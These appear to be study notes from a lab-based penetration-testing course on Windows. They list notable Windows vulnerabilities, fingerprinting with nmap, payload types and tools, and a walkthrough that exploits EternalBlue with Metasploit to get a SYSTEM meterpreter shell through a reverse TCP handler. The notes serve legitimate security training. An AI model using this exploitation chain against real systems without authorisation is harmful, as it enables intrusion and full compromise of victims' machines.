| Vulnerability    | Description                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |

| `MS08-067`       | MS08-067 was a critical patch pushed out to many different Windows revisions due to an SMB flaw. This flaw made it extremely easy to infiltrate a Windows host. It was so efficient that the Conficker worm was using it to infect every vulnerable host it came across. Even Stuxnet took advantage of this vulnerability.                                                                                                                                                                                      |
| `Eternal Blue`   | MS17-010 is an exploit leaked in the Shadow Brokers dump from the NSA. This exploit was most notably used in the WannaCry ransomware and NotPetya cyber attacks. This attack took advantage of a flaw in the SMB v1 protocol allowing for code execution. EternalBlue is believed to have infected upwards of 200,000 hosts just in 2017 and is still a common way to find access into a vulnerable Windows host.                                                                                                |
| `PrintNightmare` | A remote code execution vulnerability in the Windows Print Spooler. With valid credentials for that host or a low privilege shell, you can install a printer, add a driver that runs for you, and grants you system-level access to the host. This vulnerability has been ravaging companies through 2021. 0xdf wrote an awesome post on it [here](https://0xdf.gitlab.io/2021/07/08/playing-with-printnightmare.html).                                                                                          |
| `BlueKeep`       | CVE 2019-0708 is a vulnerability in Microsoft's RDP protocol that allows for Remote Code Execution. This vulnerability took advantage of a miss-called channel to gain code execution, affecting every Windows revision from Windows 2000 to Server 2008 R2.                                                                                                                                                                                                                                                     |
| `Sigred`         | CVE 2020-1350 utilized a flaw in how DNS reads SIG resource records. It is a bit more complicated than the other exploits on this list, but if done correctly, it will give the attacker Domain Admin privileges since it will affect the domain's DNS server which is commonly the primary Domain Controller.                                                                                                                                                                                                   |
| `SeriousSam`     | CVE 2021-36934 exploits an issue with the way Windows handles permission on the `C:\Windows\system32\config` folder. Before fixing the issue, non-elevated users have access to the SAM database, among other files. This is not a huge issue since the files can't be accessed while in use by the pc, but this gets dangerous when looking at volume shadow copy backups. These same privilege mistakes exist on the backup files as well, allowing an attacker to read the SAM database, dumping credentials. |
| `Zerologon`      | CVE 2020-1472 is a critical vulnerability that exploits a cryptographic flaw in Microsoftâ€™s Active Directory Netlogon Remote Protocol (MS-NRPC). It allows users to log on to servers using NT LAN Manager (NTLM) and even send account changes via the protocol. The attack can be a bit complex, but it is trivial to execute since an attacker would have to make around 256 guesses at a computer account password before finding what they need. This can happen in a matter of a few seconds.              |
## Enumerating Windows and Fingerprinting Methods

When enumerating systems and targets, one quick command that we can run is a ping command. From the ping command we can see that the windows host has a TTL (Time to Live) of around 128. 
```shell-session
realCustampin@htb[/htb]$ ping 192.168.86.39 

PING 192.168.86.39 (192.168.86.39): 56 data bytes
64 bytes from 192.168.86.39: icmp_seq=0 ttl=128 time=102.920 ms
64 bytes from 192.168.86.39: icmp_seq=1 ttl=128 time=9.164 ms
64 bytes from 192.168.86.39: icmp_seq=2 ttl=128 time=14.223 ms
64 bytes from 192.168.86.39: icmp_seq=3 ttl=128 time=11.265 ms
```

**Utilizing nmap:**
- When doing an nmap scan, we can use the -v option to initialize an OS Identification scan. 

```shell-session
realCustampin@htb[/htb]$ sudo nmap -v -O 192.168.86.39

Now that we have our target OS, let's try to enumerate what services they are running through a banner grab on nmap. 

```shell-session
realCustampin@htb[/htb]$ sudo nmap -v 192.168.86.39 --script banner.nse

## Windows Payload Types

DLLs: Dynamic Linking Library is a library file that contains shared code and data that many programs can use simultaneous. 

Batch: Batch files are text-based DOS files that can be used to complete multiple tasks through the command line interpreter. 

VBS: VBScript is a client-side scripting language that in webservers to enable dynamic web pages. VBS is dated and disabled by most modern web browsers. 

MSI: .msi files server as an installation database for the Windows installer. 

Powershell: Both a shell environment and a scripting language

**Windows Tools to Use for Payload Injection:**
- `Impacket`: [Impacket](https://github.com/SecureAuthCorp/impacket) is a toolset built in Python that provides us with a way to interact with network protocols directly. Some of the most exciting tools we care about in Impacket deal with `psexec`, `smbclient`, `wmi`, Kerberos, and the ability to stand up an SMB server.
- [Payloads All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute.md): is a great resource to find quick oneliners to help transfer files across hosts expediently.
- `SMB`: SMB can provide an easy to exploit route to transfer files between hosts. This can be especially useful when the victim hosts are domain joined and utilize shares to host data. We, as attackers, can use these SMB file shares along with C$ and admin$ to host and transfer our payloads and even exfiltrate data over the links.
- `Remote execution via MSF`: Built into many of the exploit modules in Metasploit is a function that will build, stage, and execute the payloads automatically.
- `Other Protocols`: When looking at a host, protocols such as FTP, TFTP, HTTP/S, and more can provide you with a way to upload files to the host. Enumerate and pay attention to the functions that are open and available for use.

## Example Walkthrough of Compromise

1. Enumerate the Host using nmap: 
```shell-session
realCustampin@htb[/htb]$ nmap -v -A 10.129.201.97

Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-27 18:13 EDT

```
- Looking at the information provided by our nmap scan, we can list out our attack vectors:
	- IIS 
	- SMB
	- Windows OS Version (Windows Server 2016 Standard 6.3)
- We know that MS17-10 (EternalBlue) exploit affects hosts running Windows 2008 to Windows Server 2016, so we can use this as a good baseline for our attack.  

2. Using Metasploit, we can now search for some attack vectors and payloads in order to exploit the target: 
```shell-session
msf6 auxiliary(scanner/smb/smb_ms17_010) > use auxiliary/scanner/smb/smb_ms17_010 
msf6 auxiliary(scanner/smb/smb_ms17_010) > show options

msf6 auxiliary(scanner/smb/smb_ms17_010) > run

[+] 10.129.201.97:445     - Host is likely VULNERABLE to MS17-010! - Windows Server 2016 Standard 14393 x64 (64-bit)
[*] 10.129.201.97:445     - Scanned 1 of 1 hosts (100% complete)

```
- As you can see, we use a scanner to tell us whether the host is likely to be vulnerable or not to the Eternal Blue exploit described above.

- We need to ensure that all the options are filled out correctly in order to gain access to the shell. 

4. Execute the Attack
```shell-session
msf6 exploit(windows/smb/ms17_010_psexec) > exploit

[*] Started reverse TCP handler on 10.10.14.12:4444 
[*] 10.129.201.97:445 - Target OS: Windows Server 2016 Standard 14393

meterpreter > getuid

Server username: NT AUTHORITY\SYSTEM
meterpreter > 
```
- We have success, was we are thrown in to a meterpreter shell, we now have access to the target system. 

5. Identify the Shell
```shell-session
meterpreter > shell
